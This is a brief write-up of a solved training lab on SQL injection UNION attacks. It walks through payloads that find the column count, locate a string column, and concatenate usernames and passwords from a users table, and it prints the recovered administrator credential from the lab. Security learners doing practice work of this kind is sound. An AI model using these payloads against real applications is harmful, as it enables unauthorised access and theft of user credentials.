# Lab 6 - SQL injection UNION attack, retrieving multiple values in a single column

**Status**: Solved the 1st August 2023.

**Objective**: Retrieve al the `username` and `password` values from the `users` table, and log in as the `administrator` user.

## Solving Process

- First, the number of columns has to be determined, the following payload was the one that didn't returned an error message:
  - `'+UNION+SELECT+NULL,NULL--`
  - The number of columns is 2
- The next step is to check which columns support strings. And by inserting a string in each column position, the following payload returned no errors:
  - `'+UNION+SELECT+NULL,'def'--`
  - So in this case, only the second column support string
- Since only 1 column support strings, the `username` and `password` can't be outputted as usual, instead they need to be concatenated into a single string in the second column, for the `UNION` statement to work with no type errors. The following payload worked to retrieve the information we're looking for:
  - `'+UNION+SELECT+NULL,username||':'||password+FROM+users--`
  - The returned string for `administrator` is: `administrator:g9rtos0vmaegb4zo3tbp`
- By entering the credentials we've successfully logged in.
